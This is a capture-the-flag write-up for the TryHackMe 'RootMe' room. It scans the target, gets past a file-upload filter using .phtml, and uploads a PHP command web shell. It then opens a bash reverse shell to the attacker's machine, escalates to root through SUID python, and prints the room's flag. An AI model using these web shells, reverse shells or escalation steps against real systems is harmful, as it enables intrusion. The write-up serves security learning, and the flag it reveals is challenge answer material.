# Challenge: 

https://tryhackme.com/room/rrootme

1. Bypass file upload restriction
2. Upload php file
3. Gain reverse shell
4. Gain root access

## Scouting

`sudo nmap 10.18.72.160 -sV -p- -T5`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 10:59 EST
Warning: 10.10.118.61 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.118.61
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
29072/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 626.88 seconds
```

## Use gobuster to find hidden website director

`gobuster dir -u 10.10.187.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.187.26
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/01/11 13:20:19 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.187.26/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.187.26/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.187.26/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.187.26/panel/]
Progress: 8981 / 220561 (4.07%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/11 13:22:40 Finished
===============================================================
```

## Bypassed .php block by uploading with .phtml

```
phtml, .php, .php3, .php4, .php5, and .inc
```

https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass

## Check if php is usable

Test payload:
```
<?php

	echo system($_GET["cmd"]);

?> 
```

On website:

`http://10.10.187.26/uploads/a.phtml?cmd=id;whoami`

## Create reverse shell php file

On kali, start netcat listener: 

`nc -nvlp 1234`

On kali, get our own IP:

`ip a`

```
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet {local ip}/17 scope global tun0 <----------------------------------------
       valid_lft forever preferred_lft forever
    inet6 {local ipv6}/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

Create simple reverse shell:

```
<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/{local ip}/1234 0>&1'");
```

Navigate to the file on the website.

`http://10.10.187.26/uploads/b.phtml`

## Find file with SUID perm. and use it to gain root

`find . -perm /4000 `
```
...
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
...
```

This finds that python has SUID. Use python SUID exploit.

From: https://gtfobins.github.io/gtfobins/python/

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

## Find and get the flag

`find / -iname root.txt`

```
/root/root.txt
```

`cat /root/root.txt`
```
THM{pr1v1l3g3_3sc4l4t10n}
```
